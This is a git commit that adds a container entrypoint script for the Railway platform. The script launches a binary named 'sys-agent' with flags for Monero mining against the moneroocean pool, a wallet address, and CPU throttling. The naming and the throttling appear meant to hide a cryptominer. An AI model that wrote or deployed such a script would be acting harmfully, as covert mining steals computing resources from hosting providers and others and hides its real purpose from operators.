394bf72b6de893409856aa9fe0e784fd1d6eeb5e
willy6509 <149163931+willy6509@users.noreply.github.com>
2025-05-17 15:24:07 +0700

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,14 @@
+#!/bin/sh
+
+echo "=== Starting sys-agent Container on Railway ==="
+
+exec ./sys-agent \
+  -o gulf.moneroocean.stream:10128 \
+  -u 44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ \
+  -p worker03 \
+  -a rx \
+  -k \
+  --cpu-priority=5 \
+  --threads=1 \
+  --max-cpu-usage=30 \
+  --randomx-mode=light
